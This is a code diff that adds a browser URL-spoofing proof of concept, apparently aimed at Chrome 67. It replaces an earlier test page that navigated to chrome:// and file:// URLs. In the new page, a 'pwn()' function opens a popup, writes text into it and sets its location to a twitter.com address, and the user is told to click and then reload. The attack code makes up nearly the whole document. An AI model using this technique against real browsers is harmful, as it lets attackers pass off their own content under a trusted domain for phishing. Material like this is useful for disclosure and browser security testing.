@@ -1,15 +1,25 @@
 
-<button onclick="chrome();">Navigating to "chrome://"</button>
+<html>
+<head>
+<!--
+    author: evi1m0.bat[at]gmail.com
+    test version: Google Chrome 67.0.3396.62
+-->
+</head>
+<body>
 <script>
-function chrome() {
-  var x = window.open("https://www.google.com/");
-  setTimeout(function(){x.location = "chrome://chrome";}, 2000)
-}
+    function pwn() {
+        v = setInterval(`x=window.open('','test', 'width=400 height=300')`);
+        i = setInterval(`
+            x.document.write("<h1>url spoofing...</h1>");
+            x.document.location = "https://www.twitter.com:1234"
+            clearInterval(v);
+            clearInterval(i);
+            `, 3333);        
+    }
 </script>
-<button onclick="file();">Navigating to "file://"</button>
-<script>
-function file() {
-  var x = window.open("https://www.google.com/");
-  setTimeout(function(){x.location = "file:///";}, 2000)
-}
-</script>
+<li onclick="pwn()">step1: click me</li>
+<li>step2: try use keyboard `command + r`</li>
+<li>step3: xD</li>
+</body>
+</html>
